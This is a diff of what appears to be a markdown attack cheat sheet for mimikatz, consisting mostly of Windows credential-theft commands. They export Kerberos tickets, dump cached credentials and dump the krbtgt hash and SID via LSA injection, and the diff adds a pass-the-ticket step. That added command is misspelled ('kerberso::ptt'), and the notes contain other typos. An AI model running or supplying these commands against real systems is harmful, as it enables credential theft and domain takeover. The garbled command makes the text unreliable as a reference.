@@ -7,10 +7,11 @@ https://github.com/gentilkiwi/mimikatz/release
 
 if you don't run mimikatz as an administrator, mimikatz will not run properly
 
-```sh
+```ls
 
-Export Tickets Use /export
-Always try /patch and /inject  in LSA dump sDifferenct technique of the attack
+
+#Export Tickets Use /export
+#Always try /patch and /inject  in LSA dump sDifferenct technique of the attack
 
 #The debug privilege allows you to debug and tune the memory of a process owned by another user account  a necessary step for extracting plaintext passwords from LSASS.
 
@@ -48,6 +49,8 @@ lsadump::cache
 #extract tickets
 sekurlsa::tickets /export
 
+#pass the ticket 
+kerberso::ptt  <savedFile>
 
 #To Dump hash  and SID of the krbtgt 
 lsadump::lsa /inject /name:krbtgt
